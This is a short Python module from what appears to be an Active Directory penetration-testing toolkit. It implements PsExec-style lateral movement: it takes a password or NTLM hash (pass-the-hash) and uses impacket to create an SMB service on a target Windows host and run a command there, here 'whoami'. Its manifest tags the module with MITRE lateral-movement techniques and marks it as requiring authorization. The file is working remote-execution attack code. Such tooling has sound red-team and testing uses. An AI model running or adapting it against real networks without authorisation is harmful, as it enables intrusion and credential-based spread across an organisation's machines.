"""PsExec — remote command execution via SMB service creation."""

from __future__ import annotations

import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.psexec.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["smb_service_creation", "remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1569.002", "T1021.002"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    if not cred.has_password and not cred.has_hash:
        print("[!] PsExec requires credentials", file=sys.stderr)
        return 1

    print(f"[*] PsExec → {args.target} ({args.domain}\\{cred.username})")

    try:
        from impacket.examples.psexec import PSEXEC
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        executer = PSEXEC(
            "whoami", None, None,
            username=cred.username, password=cred.password or "",
            domain=args.domain, hashes=cred.impacket_hash if cred.has_hash else None,
        )
        executer.run(args.target)
        print("[+] PsExec command executed")
        return 0
    except Exception as exc:
        print(f"[-] PsExec failed: {exc}", file=sys.stderr)
        return 1
